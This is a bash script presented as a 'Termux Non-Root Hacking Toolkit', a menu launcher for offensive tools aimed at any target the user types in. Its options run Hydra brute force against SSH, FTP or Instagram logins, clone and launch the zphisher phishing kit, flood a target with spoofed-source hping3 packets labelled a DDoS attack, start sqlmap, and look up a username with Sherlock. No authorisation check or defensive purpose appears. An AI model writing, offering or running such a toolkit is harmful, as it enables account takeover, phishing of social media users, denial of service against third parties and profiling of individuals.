#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${GREEN}"
cat << "EOF"
  _____                   _    _       _ _    
 |_   _|                 | |  | |     | | |   
   | | ___ _ __ _ __ ___ | |__| |_   _| | | __
   | |/ _ \ '__| '_ ` _ \|  __  | | | | | |/ /
   | |  __/ |  | | | | | | |  | | |_| | |   < 
   \_/\___|_|  |_| |_| |_|_|  |_|\__,_|_|_|\_\
EOF
echo -e "${NC}"
echo -e "${YELLOW}Termux Non-Root Hacking Toolkit${NC}"
echo -e "${BLUE}----------------------------------------${NC}"

# Main Menu
while true; do
    echo -e "\n${GREEN}[+] Select an option:${NC}"
    echo "1. Network Scanner (Nmap, Ping)"
    echo "2. Brute Force Attack (Hydra)"
    echo "3. Phishing Tool (Social Media)"
    echo "4. DDoS Attack (UDP Flood)"
    echo "5. Web Hacking (SQLi, XSS)"
    echo "6. OSINT Recon (Sherlock, Phone Lookup)"
    echo "7. Exit"
    read -p "> " choice

    case $choice in
        1)
            echo -e "\n${YELLOW}[*] Network Scanner${NC}"
            if ! command -v nmap &> /dev/null; then
                pkg install nmap -y
            fi
            read -p "Enter target IP/host: " target
            nmap -sV $target
            ;;
        2)
            echo -e "\n${YELLOW}[*] Brute Force Attack${NC}"
            if ! command -v hydra &> /dev/null; then
                pkg install hydra -y
            fi
            read -p "Enter target IP: " ip
            read -p "Enter service (ssh/ftp/instagram): " service
            read -p "Enter username: " user
            read -p "Enter wordlist path: " wordlist
            hydra -l $user -P $wordlist $ip $service
            ;;
        3)
            echo -e "\n${YELLOW}[*] Phishing Tool${NC}"
            git clone https://github.com/htr-tech/zphisher
            cd zphisher && bash zphisher.sh
            ;;
        4)
            echo -e "\n${YELLOW}[*] DDoS Attack${NC}"
            if ! command -v hping3 &> /dev/null; then
                pkg install hping3 -y
            fi
            read -p "Enter target IP: " ip
            read -p "Enter port (default: 80): " port
            hping3 --flood --rand-source -p ${port:-80} $ip
            ;;
        5)
            echo -e "\n${YELLOW}[*] Web Hacking${NC}"
            git clone https://github.com/sqlmapproject/sqlmap
            cd sqlmap && python sqlmap.py --wizard
            ;;
        6)
            echo -e "\n${YELLOW}[*] OSINT Recon${NC}"
            git clone https://github.com/sherlock-project/sherlock
            cd sherlock && python3 -m pip install -r requirements.txt
            read -p "Enter target username: " username
            python3 sherlock.py $username
            ;;
        7)
            echo -e "${RED}[!] Exiting...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option!${NC}"
            ;;
    esac
done